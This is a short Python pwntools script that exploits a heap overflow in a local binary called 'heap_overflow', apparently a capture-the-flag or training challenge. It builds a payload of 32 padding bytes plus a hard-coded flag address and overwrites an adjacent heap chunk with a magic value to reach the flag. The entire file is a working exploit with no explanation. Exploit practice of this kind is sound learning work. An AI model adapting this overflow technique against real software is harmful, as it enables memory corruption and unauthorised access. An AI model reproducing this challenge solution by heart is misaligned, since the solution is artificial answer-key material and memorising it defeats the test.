from pwn import *

p = process("./heap_overflow")
# gdb.attach(p)

def create():
    # menu
    p.recvuntil(b"> ")
    p.send(b"1\n")

def insert(idx, data):
    # menu
    p.recvuntil(b"> ")
    p.send(b"2\n")
    # select idx
    p.recvuntil(b"> ")
    p.send(idx + b'\n')
    # input
    p.recvuntil(b"> ")
    p.send(data + b'\n')

def modify(idx, data):
    # menu
    p.recvuntil(b"> ")
    p.send(b"3\n")
    # select idx
    p.recvuntil(b"> ")
    p.send(idx + b'\n')
    # input
    p.recvuntil(b"> ")
    p.send(data + b'\n')
    


flag_address = p64(0x404090) # > p &flag 
payload = b"C"*32+ flag_address
create()
insert(b"0",b"A"*7)
create()
insert (b"1",b"B"*7)
print(hexdump(payload))

modified_data = b"\x37\x13\x03\x00\x00\x00\x00\x00" # the answer of heap_overflow.c line 210

modify(b"0", payload)
modify(b"1", modified_data) 
p.interactive()
